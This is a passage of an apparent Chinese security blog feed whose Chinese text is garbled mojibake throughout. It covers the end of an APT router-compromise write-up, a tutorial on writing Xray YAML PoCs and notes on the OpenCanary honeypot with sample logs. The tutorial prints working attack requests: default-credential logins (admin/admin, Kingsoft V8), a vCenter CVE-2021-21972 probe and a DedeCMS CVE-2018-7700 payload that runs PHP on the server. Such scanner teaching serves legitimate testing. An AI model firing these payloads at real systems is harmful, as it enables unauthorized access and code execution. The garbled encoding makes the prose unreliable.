ä¸€å°è¿è¡ŒCentOSçš„è™šæ‹Ÿæœºï¼Œå¯æ ¹æ®é¢„å®šä¹‰çš„è§„åˆ™åœ¨å¤šä¸ªç½‘ç»œæ¥å£ä¹‹é—´è¿›è¡Œè·¯ç”±è¿æ¥ã€‚æ”»å‡»è€…æ‰«æäº†è·¯ç”±å™¨çš„ç«¯å£å¹¶æ£€æµ‹åˆ°Webminç•Œé¢ã€‚æ¥ä¸‹æ¥ï¼Œæ”»å‡»è€…ä½¿ç”¨ç‰¹æƒæ ¹å¸æˆ·ç™»å½•Webç•Œé¢ã€‚å‡­æ®å¯èƒ½ä¿å­˜åœ¨å—æ„ŸæŸ“ç³»ç»Ÿçš„æµè§ˆå™¨å¯†ç ç®¡ç†å™¨ä¹‹ä¸€ä¸­ã€‚</p><p>é€šè¿‡è®¿é—®é…ç½®é¢æ¿ï¼Œæ”»å‡»è€…é…ç½®äº†Apache WebæœåŠ¡å™¨ï¼Œå¹¶å¼€å§‹å°†è·¯ç”±å™¨ç”¨ä½œç»„ç»‡çš„å…¬å¸éƒ¨é—¨å’Œå—é™éƒ¨é—¨ä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ã€‚</p><h4 id="æ•°æ®æ³„æ¼"><a href="#æ•°æ®æ³„æ¼" class="headerlink" title="æ•°æ®æ³„æ¼"></a>æ•°æ®æ³„æ¼</h4><p>ä¸ºäº†åˆ›å»ºéšè”½é€šé“ï¼Œæ¶æ„è½¯ä»¶ä½¿ç”¨trivial binary encryptionå¯¹è½¬å‘çš„æµé‡è¿›è¡ŒåŠ å¯†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>APT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xray_poc_ç¼–å†™å­¦ä¹ </title>
    <link href="/2021/04/27/Xray_poc_%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/27/Xray_poc_%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒè®¾ç½®"><a href="#ç¯å¢ƒè®¾ç½®" class="headerlink" title="ç¯å¢ƒè®¾ç½®"></a>ç¯å¢ƒè®¾ç½®</h2><h3 id="åœ¨çº¿è‡ªåŠ¨ç”Ÿæˆ"><a href="#åœ¨çº¿è‡ªåŠ¨ç”Ÿæˆ" class="headerlink" title="åœ¨çº¿è‡ªåŠ¨ç”Ÿæˆ"></a>åœ¨çº¿è‡ªåŠ¨ç”Ÿæˆ</h3><p>ç›´æ¥è®¿é—® <a href="https://phith0n.github.io/xray-poc-generation/">https://phith0n.github.io/xray-poc-generation/</a><br>æºä»“åº“<a href="https://github.com/phith0n/xray-poc-generation">phith0n/xray-poc-generation: ğŸ§¬ è¾…åŠ©ç”Ÿæˆ XRay YAML POC</a></p><h3 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h3><p>æˆ‘ä½¿ç”¨vscodeå¤šï¼Œæ‰€ä»¥é€‰æ‹©vscçš„ã€‚</p><img src="/2021/04/27/Xray_poc_%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/Snipaste_2021-04-28_23-43-47.png" class=""><p>å®‰è£…ååœ¨è¿™é‡Œç‚¹å‡»</p><img src="/2021/04/27/Xray_poc_%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/Snipaste_2021-04-28_23-45-07.png" class=""><p>ç„¶åæ”¹yaml.schemasä¸º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;yaml.schemas&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;https://docs.xray.cool/assets/poc/yaml-poc-schema.json&quot;</span>: <span class="hljs-string">&quot;poc-yaml-*.yml&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åœ¨å†™<code>poc-yaml-&#123;Your_file_name&#125;.yml</code>æ—¶å°±ä¼šæ ¹æ®å®˜æ–¹schemaæ¥æç¤ºäº†</p><h2 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">name: poc-yaml-learning<br>rules:<br>  - method: GET<br>    path: <span class="hljs-string">&quot;/&quot;</span><br>    expression: |<br>      response.<span class="hljs-attribute">status</span>==200 &amp;&amp; body.bcontains(b<span class="hljs-string">&#x27;learning Domain&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ•´ä¸ª POC æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼ŒåŒ…å«3ä¸ªé”®ï¼š</p><ul><li><code>name: string</code>  åå­—</li><li><code>set: []string</code> å®šä¹‰å˜é‡ï¼Œå¦‚éšæœºæ•°å’Œåè¿å¹³å°ç­‰ </li><li><code>rules: []Rule</code> è§„åˆ™åˆ—è¡¨</li><li><code>detail: map[string]string</code> å†…éƒ¨å­˜å‚¨éœ€è¦è¿”å›ç»™ xray å¼•æ“çš„å†…å®¹ï¼Œå¦‚æœæ— å¯å¿½ç•¥ã€‚</li></ul><p>Ruleæ˜¯pocçš„çµé­‚ï¼Œyamlé‡Œä¸€ä¸ªruleæ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼ŒåŒ…å«ï¼š</p><ul><li><code>method: string</code> è¯·æ±‚æ–¹æ³•</li><li><code>path: string</code> è¯·æ±‚çš„å®Œæ•´ Pathï¼ŒåŒ…æ‹¬ querystring ç­‰</li><li><code>headers: map[string]string</code> è¯·æ±‚ HTTP å¤´ï¼ŒRule ä¸­æŒ‡å®šçš„å€¼ä¼šè¢«è¦†ç›–åˆ°åŸå§‹æ•°æ®åŒ…çš„ HTTP å¤´ä¸­</li><li><code>body: string</code> è¯·æ±‚çš„Body</li><li><code>follow_redirects: bool</code> æ˜¯å¦å…è®¸è·Ÿéš300è·³è½¬</li><li><code>expression: string</code></li><li><code>search: string</code></li></ul><h3 id="Rule"><a href="#Rule" class="headerlink" title="Rule"></a>Rule</h3><p>æ ¹æ®è¿™äº›é”®çš„ä½œç”¨ï¼Œåˆ†ä¸ºä¸‰ç±»ï¼š</p><ol><li><code>method</code>ã€<code>path</code>ã€<code>headers</code>ã€<code>body</code>ã€<code>follow_redirects</code>çš„ä½œç”¨æ˜¯ç”Ÿæˆæ£€æµ‹æ•°æ®åŒ…</li><li><code>expression</code> çš„ä½œç”¨æ˜¯åˆ¤æ–­è¯¥æ¡ Rule çš„ç»“æœ</li><li><code>search</code> çš„ä½œç”¨æ˜¯ä»è¿”å›åŒ…ä¸­æå–ä¿¡æ¯</li></ol><h3 id="æ€ä¹ˆå†™expression"><a href="#æ€ä¹ˆå†™expression" class="headerlink" title="æ€ä¹ˆå†™expression"></a>æ€ä¹ˆå†™expression</h3><p>éƒ¨åˆ†å‡½æ•°æ–¹æ³•</p><ul><li><code>response.content_type.contains(&#39;application/octet-stream&#39;) &amp;&amp; response.body.bcontains(b&#39;\x00\x01\x02&#39;)</code><ul><li>è¿”å›åŒ…çš„ content-type åŒ…å« application/octet-streamï¼Œä¸” body ä¸­åŒ…å« 0x000102 è¿™æ®µäºŒè¿›åˆ¶ä¸²</li></ul></li><li><code>response.body.bcontains(b&#39;test&#39;)</code><ul><li>è¿”å›åŒ… body åŒ…å« bytes ç±»å‹çš„ testï¼Œç”¨bcontainsæ–¹æ³•</li></ul></li><li><code>r&#39;^PK\x03\x04&#39;.bmatches(response.body)</code><ul><li>body åŒ¹é…ä¸Šæ­£åˆ™<code>r&#39;^PK\\x03\\x04</code>ï¼ˆæ–‡ä»¶å¤´åˆ¤æ–­ï¼‰</li></ul></li><li><code>response.status &gt;= 300 &amp;&amp; response.status &lt; 400</code><ul><li>è¿”å›åŒ…çš„ status code åœ¨ 300~400 ä¹‹é—´</li></ul></li><li><code>r&#39;&lt;input value=&quot;(.+?)&quot;&#39;.bmatches(response.body)</code><ul><li>BodyåŒ…å«è¡¨å•</li></ul></li><li><code>response.headers[&#39;location&#39;]==&quot;https://www.example.com&quot;</code><ul><li>headers ä¸­ <code>Location</code> ç­‰äºæŒ‡å®šå€¼ï¼Œå¦‚æœ <code>Location</code> ä¸å­˜åœ¨ï¼Œè¯¥è¡¨è¾¾å¼è¿”å› false</li></ul></li><li><code>&#39;docker-distribution-api-version&#39; in response.headers &amp;&amp; response.headers[&#39;docker-distribution-api-version&#39;].contains(&#39;registry/2.0&#39;)</code><ul><li>headers ä¸­åŒ…å« <code>docker-distribution-api-version</code> å¹¶ä¸” value åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²ï¼Œå¦‚æœä¸åˆ¤æ–­ <code>in</code>ï¼Œåç»­çš„ contains ä¼šå‡ºé”™ã€‚</li><li><code>response.body.bcontains(bytes(response.url.path))</code><ul><li>body ä¸­åŒ…å« url çš„ path</li></ul></li></ul></li></ul><p>expressionè¡¨è¾¾å¼è¿”å›çš„å¿…é¡»æ˜¯ä¸€ä¸ªboolç±»å‹çš„</p><p>å®Œæ•´å‚è€ƒ <a href="https://docs.xray.cool/#/guide/poc?id=%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99expression%e8%a1%a8%e8%be%be%e5%bc%8f">å®˜æ–¹ç®€çŸ­è¯´æ˜</a> æˆ– <a href="[https://github.com/google/cel-spec](https://github.com/google/cel-spec">CELè¡¨è¾¾å¼è¯¦ç»†ä¿¡æ¯</a></p><h3 id="æ€ä¹ˆç”¨search"><a href="#æ€ä¹ˆç”¨search" class="headerlink" title="æ€ä¹ˆç”¨search"></a>æ€ä¹ˆç”¨search</h3><p><strong>ä»è¿”å›åŒ…ä¸­æå–ä¿¡æ¯</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">name: poc-yaml-example-com<br>rules:<br>  - method: GET<br>    path: <span class="hljs-string">&quot;/update&quot;</span><br>    expression: <span class="hljs-string">&quot;true&quot;</span><br>    search: |<br>      &lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;csrftoken&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;(?P&lt;token&gt;.+?)&quot;</span><br>  - method: POST<br>    path: <span class="hljs-string">&quot;/update&quot;</span><br>    body: |<br>      <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;;echo(md5(123));//&amp;csrftoken=&#123;&#123;token&#125;&#125;</span><br><span class="hljs-string">    expression: |</span><br><span class="hljs-string">      status == 200 &amp;&amp; body.bcontains(b&#x27;</span>202cb962ac59075b964b07152d234b70&#x27;)<br></code></pre></td></tr></table></figure><p><code>?P&lt;var&gt;</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼å‘½åç»„çš„è¯­æ³•ï¼Œå¯åœ¨ <a href="https://regex101.com/r/VQndKy/1/">https://regex101.com/r/VQndKy/1/</a> è°ƒè¯•ã€‚<code>&#123;&#123;`ã€`&#125;&#125;</code>ä¸­åŒ…å«çš„åå­—æ˜¯æ­£åˆ™çš„æå–çš„æ•°æ®ï¼Œæ²¡æå–æˆåŠŸå°±ä¸ä¼šè¿›è¡Œæ›¿æ¢ã€‚</p><h2 id="pocçš„æ‰§è¡Œè¿‡ç¨‹"><a href="#pocçš„æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="pocçš„æ‰§è¡Œè¿‡ç¨‹"></a>pocçš„æ‰§è¡Œè¿‡ç¨‹</h2><p>å…ˆå¯¹pocçš„å…³é”®ï¼Œsetå’Œexpressionéƒ¨åˆ†è¿›è¡Œé¢„ç¼–è¯‘å’Œé™æ€ç±»å‹æ£€æŸ¥ï¼Œç„¶åæœ‰æ–°çš„è¯·æ±‚/é“¾æ¥æ—¶ï¼Œæ ¹æ®ruleå¯¹è¯·æ±‚è¿›è¡Œä¿®æ”¹ï¼Œæ›¿æ¢æ‰åŸå§‹æ•°æ®åŒ…çš„æ•°æ®ï¼Œå†è·å–å¯¹åº”è¯·æ±‚çš„å“åº”ï¼ŒåŒ¹é…<code>expression</code>å°±è¿›è¡Œä¸‹ä¸€ä¸ªruleï¼Œå…¨éƒ¨ruleæ‰§è¡Œå®Œæˆåï¼Œè¡¨ç¤ºæœ‰æ¼æ´ï¼Œå¹¶å°†detailçš„ä¿¡æ¯è¿›è¡Œæ¼æ´è¾“å‡º</p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>å®˜æ–¹ä»“åº“é‡Œç»è¿‡æ¼æ´é•œåƒå®¡æ ¸çš„poc <a href="https://github.com/chaitin/xray/tree/master/pocs">https://github.com/chaitin/xray/tree/master/pocs</a></p><h3 id="è‡ªå·±å°ä¾‹å­"><a href="#è‡ªå·±å°ä¾‹å­" class="headerlink" title="è‡ªå·±å°ä¾‹å­"></a>è‡ªå·±å°ä¾‹å­</h3><p>ä¹‹å‰æ•´è¿‡pythonä»£ç è‡ªåŠ¨è·‘fofaæœå‡ºæ¥çš„é˜²ç«å¢™/è·¯ç”±å™¨çš„å¼±å£ä»¤ï¼Œå½“æ—¶ä¹ŸåŸºæœ¬æ˜¯é’ˆå¯¹æ€§çš„å†™çš„è„šæœ¬ï¼Œå¤§æ¦‚æœ‰50è¡Œï¼Œè€Œç°åœ¨ç²˜è´´è·¯å¾„ï¼ŒUser-Agentï¼Œè¿˜è¦bodyï¼Œä»¥åŠå“åº”çš„åˆ¤æ–­å³å¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">poc-yaml-weekpasswd</span><br><span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">/userLogin.asp</span><br>    <span class="hljs-attr">headers:</span><br>      <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">&gt;-</span><br>        <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span><br>        <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/90.0.4430.85</span> <span class="hljs-string">Safari/537.36</span> <span class="hljs-string">Edg/90.0.818.49</span><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">&gt;-</span><br>      <span class="hljs-string">save2Cookie=&amp;vldcode=&amp;account=admin&amp;password=admin&amp;btnSubmit=+%B5%C7%C2%BC+</span><br>    <span class="hljs-attr">follow_redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">expression:</span> <span class="hljs-string">|</span><br>      <span class="hljs-string">response.status==200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">body.contains(&quot;xxç®¡ç†&quot;)</span><br><br><br></code></pre></td></tr></table></figure><p>éšååœ¨configé‡Œçš„pluginä¸‹ï¼Œ<code>local_poc: []</code> åŠ ä¸Šè‡ªå·±pocçš„è·¯å¾„å³å¯</p><h3 id="ç¤¾åŒºpoc"><a href="#ç¤¾åŒºpoc" class="headerlink" title="ç¤¾åŒºpoc"></a>ç¤¾åŒºpoc</h3><p><a href="https://github.com/chaitin/xray/blob/master/pocs/kingsoft-v8-default-password.yml">æºåœ°å€</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift">name: poc<span class="hljs-operator">-</span>yaml<span class="hljs-operator">-</span>kingsoft<span class="hljs-operator">-</span>v8<span class="hljs-operator">-</span><span class="hljs-keyword">default</span><span class="hljs-operator">-</span>password<br>rules:<br>  <span class="hljs-operator">-</span> method: <span class="hljs-type">POST</span><br>    path: <span class="hljs-operator">/</span>inter<span class="hljs-operator">/</span>ajax.php<span class="hljs-operator">?</span>cmd<span class="hljs-operator">=</span>get_user_login_cmd<br>    body: <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>get_user_login_cmd<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>name<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>admin<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>password<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>21232f297a57a5a743894a0e4a801fc3<span class="hljs-subst">\&quot;</span>&#125;&#125;&quot;</span><br>    follow_redirects: <span class="hljs-literal">true</span><br>    expression: <span class="hljs-operator">|</span><br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;ADMIN&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;userSession&quot;</span>)<br>detail:<br>  author: <span class="hljs-type">B1anda0</span>(https:<span class="hljs-comment">//github.com/B1anda0)</span><br>  links:<br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//idc.wanyunshuju.com/aqld/2123.html</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/chaitin/xray/blob/master/pocs/vmware-vcenter-unauthorized-rce-cve-2021-21972.yml">xray/vmware-vcenter-unauthorized-rce-cve-2021-21972.yml at master Â· chaitin/xray</a></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">name:</span> poc-yaml-vmware-vcenter-unauthorized-rce-cve<span class="hljs-number">-2021</span><span class="hljs-number">-21972</span><br><span class="hljs-symbol">rules:</span><br>  - method: GET<br><span class="hljs-symbol">    path:</span> <span class="hljs-meta-keyword">/ui/</span>vropspluginui<span class="hljs-meta-keyword">/rest/</span>services/uploadova<br><span class="hljs-symbol">    follow_redirects:</span> false<br><span class="hljs-symbol">    expression:</span> |<br>      response.status == <span class="hljs-number">405</span> &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;Method Not Allowed&quot;</span>)<br>  - method: GET<br><span class="hljs-symbol">    path:</span> <span class="hljs-meta-keyword">/ui/</span>vropspluginui<span class="hljs-meta-keyword">/rest/</span>services/getstatus<br><span class="hljs-symbol">    follow_redirects:</span> false<br><span class="hljs-symbol">    expression:</span> |<br>      response.status == <span class="hljs-number">200</span> &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;States&quot;</span>) &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;Install Progress&quot;</span>)<br><span class="hljs-symbol">detail:</span><br><span class="hljs-symbol">  author:</span> B1anda0(https:<span class="hljs-comment">//github.com/B1anda0)</span><br><span class="hljs-symbol">  links:</span><br>    - https:<span class="hljs-comment">//swarm.ptsecurity.com/unauth-rce-vmware/</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/chaitin/xray/blob/master/pocs/dedecms-cve-2018-7700-rce.yml">dedecms-cve-2018-7700-rce </a></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts">  <br><span class="hljs-symbol">name:</span> poc-yaml-dedecms-cve<span class="hljs-number">-2018</span><span class="hljs-number">-7700</span>-rce<br><span class="hljs-symbol">set:</span><br><span class="hljs-symbol">  r:</span> randomInt(<span class="hljs-number">2000000000</span>, <span class="hljs-number">2100000000</span>)<br><span class="hljs-symbol">rules:</span><br>  - method: GET<br><span class="hljs-symbol">    path:</span> &gt;-<br>      /tag_test_action.php?url=a<span class="hljs-variable">&amp;token</span>=<span class="hljs-variable">&amp;partcode</span>=&#123;dede:field%<span class="hljs-number">20</span>name=%<span class="hljs-number">27</span>source%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>runphp=%<span class="hljs-number">27</span>yes%<span class="hljs-number">27</span>&#125;echo%<span class="hljs-number">20</span>md5&#123;&#123;r&#125;&#125;;&#123;/dede:field&#125;<br><span class="hljs-symbol">    follow_redirects:</span> true<br><span class="hljs-symbol">    expression:</span> |<br>      response.status == <span class="hljs-number">200</span> &amp;&amp; response.body.bcontains(bytes(md5(string(r))))<br><span class="hljs-symbol">detail:</span><br><span class="hljs-symbol">  author:</span> harris2015(https:<span class="hljs-comment">//github.com/harris2015)</span><br>  Affected Version: <span class="hljs-string">&quot;V5.7SP2æ­£å¼ç‰ˆ(2018-01-09)&quot;</span><br><span class="hljs-symbol">  links:</span><br>    - https:<span class="hljs-comment">//xz.aliyun.com/t/2224</span><br></code></pre></td></tr></table></figure><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p><a href="https://docs.xray.cool/#/guide/high_quality_poc">ç¼–å†™é«˜è´¨é‡poc - xray å®‰å…¨è¯„ä¼°å·¥å…·æ–‡æ¡£</a> å¯ä»¥åå¤è§‚çœ‹å­¦ä¹ æ¯”ç…§</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OpenCanaryä½¿ç”¨åŠç†è§£</title>
    <link href="/2021/04/22/OpenCanary%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%90%86%E8%A7%A3/"/>
    <url>/2021/04/22/OpenCanary%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="åè®®æ”¯æŒåˆ—è¡¨"><a href="#åè®®æ”¯æŒåˆ—è¡¨" class="headerlink" title="åè®®æ”¯æŒåˆ—è¡¨"></a>åè®®æ”¯æŒåˆ—è¡¨</h2><p>22 ssh : a Secure Shell server which alerts on login attempts<br>21 ftp - a File Transfer Protocol server which on login attempts<br>git - a Git protocol which alerts on repo cloning<br>80 http - an HTTP web server that alerts on login attempts<br>httpproxy - an HTTP web proxy that alerts when there is an attempt to proxy to another page<br>1433 mssql - an MS SQL server that alerts on login attempts<br>3306 mysql - a MYSQL server that alerts on login attempts<br>23 telnet - a Telnet server that alerts on login attempts<br>25 snmp - an SNMP server which alerts on oid requests<br>sip - a SIP server which alerts on sip requests<br>5900 vnc - a VNC server which alerts on login attempts<br>redis - a Redis server which alerts on actions<br>tftp - a tftp server which alerts on requests<br>ntp - an NTP server which alerts on ntp requests.<br>tcpbanner - a TCPbanner service which alerts on connection and subsequent data recieved events.<br>ignorelist - comma separated ips or CIDRs that will ignore alerting on.</p><h2 id="å®‰è£…åœ¨dockerä¸­"><a href="#å®‰è£…åœ¨dockerä¸­" class="headerlink" title="å®‰è£…åœ¨dockerä¸­"></a>å®‰è£…åœ¨dockerä¸­</h2><p>ä½¿ç”¨å®˜æ–¹çš„åŠæ³•å§‹ç»ˆæ— æ³•åœ¨dockerä¸­è¿è¡Œèµ·æ¥ï¼Œåªèƒ½çœ‹åˆ°</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Attaching <span class="hljs-keyword">to</span> opencanary<br>opencanary exited <span class="hljs-keyword">with</span> code <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>æˆ‘å»æ‰¾äº†ä¸€ä¸ªæ”¹æ”¹å°±èƒ½ç”¨çš„<a href="https://github.com/mrbelieve128/Docker-OpenCanary">mrbelieve128/Docker-OpenCanary: Simple Docker image for OpenCanary in Ubuntu</a></p><h2 id="è¯•ç”¨"><a href="#è¯•ç”¨" class="headerlink" title="è¯•ç”¨"></a>è¯•ç”¨</h2><p>æ—¥å¿—ä¿å­˜åœ¨<code>/var/tmp/opencanary.log</code></p><p>80ç«¯å£</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attr">&quot;dst_port&quot;</span>: <span class="hljs-number">-1</span>, <span class="hljs-attr">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:24:33.054025&quot;</span>, <span class="hljs-attr">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:24:33.054043&quot;</span>, <span class="hljs-attr">&quot;logdata&quot;</span>: &#123;<span class="hljs-attr">&quot;msg&quot;</span>: &#123;<span class="hljs-attr">&quot;logdata&quot;</span>: <span class="hljs-string">&quot;Canary running!!!&quot;</span>&#125;&#125;, <span class="hljs-attr">&quot;logtype&quot;</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-attr">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attr">&quot;src_port&quot;</span>: <span class="hljs-number">-1</span>, <span class="hljs-attr">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:24:33.054037&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-attr">&quot;dst_port&quot;</span>: <span class="hljs-number">80</span>, <span class="hljs-attr">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:33:59.434581&quot;</span>, <span class="hljs-attr">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:33:59.434644&quot;</span>, <span class="hljs-attr">&quot;logdata&quot;</span>: &#123;<span class="hljs-attr">&quot;HOSTNAME&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-attr">&quot;PATH&quot;</span>: <span class="hljs-string">&quot;/index.html&quot;</span>, <span class="hljs-attr">&quot;SKIN&quot;</span>: <span class="hljs-string">&quot;nasLogin&quot;</span>, <span class="hljs-attr">&quot;USERAGENT&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.42&quot;</span>&#125;, <span class="hljs-attr">&quot;logtype&quot;</span>: <span class="hljs-number">3000</span>, <span class="hljs-attr">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-attr">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-attr">&quot;src_port&quot;</span>: <span class="hljs-number">55736</span>, <span class="hljs-attr">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:33:59.434633&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-attr">&quot;dst_port&quot;</span>: <span class="hljs-number">80</span>, <span class="hljs-attr">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:35:34.959679&quot;</span>, <span class="hljs-attr">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:35:34.959764&quot;</span>, <span class="hljs-attr">&quot;logdata&quot;</span>: &#123;<span class="hljs-attr">&quot;HOSTNAME&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-attr">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin1&quot;</span>, <span class="hljs-attr">&quot;PATH&quot;</span>: <span class="hljs-string">&quot;/index.html&quot;</span>, <span class="hljs-attr">&quot;SKIN&quot;</span>: <span 